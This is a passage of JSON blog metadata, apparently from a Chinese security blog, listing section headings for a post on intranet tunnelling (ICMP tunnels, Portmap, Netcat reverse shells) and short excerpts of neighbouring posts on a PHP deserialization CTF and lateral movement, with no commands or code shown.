href=\"#0x02-%E5%B8%B8%E8%A7%81%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF\"><span class=\"toc-text\">0x02 常见隧道技术</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%BA%94%E7%94%A8%E5%B1%82%E8%BF%9E%E9%80%9A%E6%80%A7%E6%A3%80%E6%B5%8B\"><span class=\"toc-text\">0x02 网络传输应用层连通性检测</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-TCP%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">0x00 TCP协议</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-%E7%BD%91%E7%BB%9C%E5%B1%82ICMP%E9%9A%A7%E9%81%93ptunnel%E4%BD%BF%E7%94%A8-%E6%A3%80%E6%B5%8B-%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">0x03 网络层ICMP隧道ptunnel使用-检测,利用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-pingtunnel%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">0x00 pingtunnel介绍</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-%E4%BC%A0%E8%BE%93%E5%B1%82%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93Portmap%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">0x04 传输层转发隧道Portmap使用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-1\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-1\"><span class=\"toc-text\">0x01</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05-%E4%BC%A0%E8%BE%93%E5%B1%82%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93-Netcat-%E4%BD%BF%E7%94%A8-%E6%A3%80%E6%B5%8B-%E5%88%A9%E7%94%A8-%E5%8A%9F%E8%83%BD\"><span class=\"toc-text\">0x05 传输层转发隧道 Netcat 使用-检测,利用,功能</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-%E5%8F%8C%E5%90%91%E8%BF%9E%E6%8E%A5%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">0x00 双向连接反弹shell</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-%E7%9B%B8%E5%85%B3-netcat-%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD\"><span class=\"toc-text\">0x02 相关 netcat 主要功能</span></a></li></ol></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUU-CODE-REVIEW","uid":"ce7038bbe334cd30b437a68d925a5eab","slug":"BUU-CODE-REVIEW","date":"2022-07-19T02:43:50.000Z","updated":"2022-07-19T03:30:50.144Z","comments":true,"path":"api/articles/BUU-CODE-REVIEW.json","keywords":null,"cover":[],"text":"0x00BUU基础题，代码审计和PHP反序列化。 0x01源码： &lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/10/6 * Time: 8:04 PM */ highlight_file(__F...","link":"","photos":[],"count_time":{"symbolsCount":"2.8k","symbolsTime":"3 mins."},"categories":[{"name":"反序列化","slug":"反序列化","count":5,"path":"api/categories/反序列化.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":5,"path":"api/tags/反序列化.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"内网安全-域横向渗透【五】","uid":"58d39df92467e98ccd5e4018d930afdc","slug":"内网安全-域横向渗透【五】","date":"2022-07-15T11:33:18.000Z","updated":"2022-07-18T02:04:58.618Z","comments":true,"path":"api/articles/内网安全-域横向渗透【五】.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 知识点0x00 内外网判断 内网ip地址是私有ip地址（10&#x2F;8, 172.16&#x2F;12 , 192.168&#x2F;16），除此之外就是外网ip。 0x01 内网1和内网2通信问题 两个不同的内网的主机想要通过CS或者MSF等工具实...","link":"","photos":[],"count_time":{"symbolsCount":"2.8k","symbolsTime":"3 mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}